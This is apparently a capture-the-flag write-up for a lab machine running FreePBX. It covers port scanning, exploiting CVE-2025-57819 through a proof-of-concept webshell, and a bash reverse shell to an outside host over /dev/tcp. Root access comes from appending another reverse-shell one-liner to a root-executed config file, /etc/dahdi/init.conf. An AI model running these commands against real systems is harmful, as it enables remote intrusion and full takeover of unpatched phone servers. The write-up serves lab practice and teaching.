```bash
 ════════════════════════════════════════════════════════
  RECON SUMMARY                                           
  ════════════════════════════════════════════════════════

  Target:        10.129.20.236
  DNS:           connected.htb
  HTTP:          80
  HTTPS:         443
  Generated:     2026-06-09 06:02:00

  ────────────────────────────────────────────────────────
  OPEN PORTS & SERVICES
  ────────────────────────────────────────────────────────
  PORT         STATE      SERVICE          VERSION
  ────────────────────────────────────────────────────────
  22/tcp       open       ssh              OpenSSH 7.4 (protocol 2.0)
  80/tcp       open       http             Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
  443/tcp      open       ssl/http         Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)

  ────────────────────────────────────────────────────────
  SUBDOMAINS  (0 found)
  ────────────────────────────────────────────────────────
  none

  ────────────────────────────────────────────────────────
  INTERESTING PATHS  (6 found)
  ────────────────────────────────────────────────────────

  [ http://connected.htb ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  301      /admin
  301      /ucp
  302      /admin

  [ https://connected.htb ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  301      /admin
  301      /ucp
  302      /admin

  ════════════════════════════════════════════════════════
```

Ok so we have 3 ports. ssh and websites. No subdomains were found. Let's check the port 80 first. 
It's a freePBX website which is a open source IP pbx which gives users the tools to build a phone system tailored to their needs. We can see that the version of freepbx so lets check the vulnerabilites for the version.

https://nvd.nist.gov/vuln/detail/cve-2025-57819


```bash
FreePBX is an open-source web-based graphical user interface. FreePBX 15, 16, and 17 endpoints are vulnerable due to insufficiently sanitized user-supplied data allowing unauthenticated access to FreePBX Administrator leading to arbitrary database manipulation and remote code execution. This issue has been patched in endpoint versions 15.0.66, 16.0.89, and 17.0.3.
```

I found a poc script that automates this part and creates us a webshell


```bash
curl http://connected.htb/shell.php?cmd=id      
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```
Now we just switch the id command to something that gives us a shell.

```bash
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.64%2F4444%200%3E%261
```
We just had to url encode it and were able to get a shell


```bash

 nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.15.64] from (UNKNOWN) [10.129.20.236] 35386
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:7B:EF:FC | 10.129.20.236             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected html]$ id
id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
[asterisk@connected html]$
```

we were able to get the flag. now we just need to get the root.txt and then we are done.

```bash
find /etc -writable 2>/dev/null | grep -v "/etc/wanpipe\|/etc/asterisk\|/etc/schmooze" |
```

/etc/dahdi/init.conf is a writeable config file.

```bash
/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
```

We can see that the writeable config file is being executed in root owned process. And since we can write on it we can get a root shell. We just inject a payload into the file

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.15.64/6666 0>&1" &' >> /etc/dahdi/init.conf
```

```bash
root@connected /]# id
id
uid=0(root) gid=0(root) groups=0(root)
```

This privesc was very difficult since it took me a very long time to find the writeable config file


